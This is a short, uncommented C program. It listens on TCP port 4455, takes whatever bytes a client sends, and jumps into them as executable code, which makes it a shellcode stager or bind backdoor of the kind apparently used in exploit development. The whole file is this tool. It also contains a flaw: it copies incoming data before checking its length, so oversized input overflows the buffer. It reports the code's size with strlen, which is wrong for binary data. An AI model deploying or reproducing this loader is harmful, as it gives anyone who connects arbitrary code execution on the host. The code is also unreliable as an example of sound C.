#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define ERROR -1
#define MAX_DATA 2048
#define MAX_SHELLCODE_LEN 4096
#define PORT 4455

char shellcode[MAX_SHELLCODE_LEN];

int main(int argc, char **argv){

	struct sockaddr_in server;
	struct sockaddr_in client;
	int sock;
	int new;
	int sockaddr_len = sizeof(struct sockaddr_in);
	int data_len, shellcode_len;
	char data[MAX_DATA];
	int (*fptr)();

	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == ERROR){
		perror("Socket Error");
		exit(-1);
	}

	server.sin_family = AF_INET;
	server.sin_port = htons(PORT);
	server.sin_addr.s_addr = INADDR_ANY;
	bzero(&server.sin_zero, 8);

	if ((bind(sock, (struct sockaddr*)&server, sockaddr_len)) == ERROR){
		perror("Bind Error");
		exit(-1);
	}

	if ((listen(sock, 1)) == ERROR){
		perror("Listen Error");
		exit(-1);
	}
		
	if ((new = accept(sock, (struct sockaddr*)&client, &sockaddr_len)) == ERROR){
		perror("Accept Error");
		exit(-1);
	}

	data_len = shellcode_len = 0;

	do{
		data_len = recv(new, data, MAX_DATA, 0);
		if (data_len){
			memcpy(&shellcode[shellcode_len], data, data_len);
			shellcode_len += data_len;
			if(shellcode_len > MAX_SHELLCODE_LEN){
				printf("Received Shellcode exceeds the Maximum Size!\n");
				exit(-1);	
			}
		}
	}while(data_len);		
		
	close(new);
	close(sock);

	if (shellcode_len){
		printf("Shellcode Size: %d\n", (int)strlen(shellcode));
		printf("Executing ... \n");
		fptr = (int(*)())shellcode;
		(int)(*fptr)();
	}

	return 0;
}	
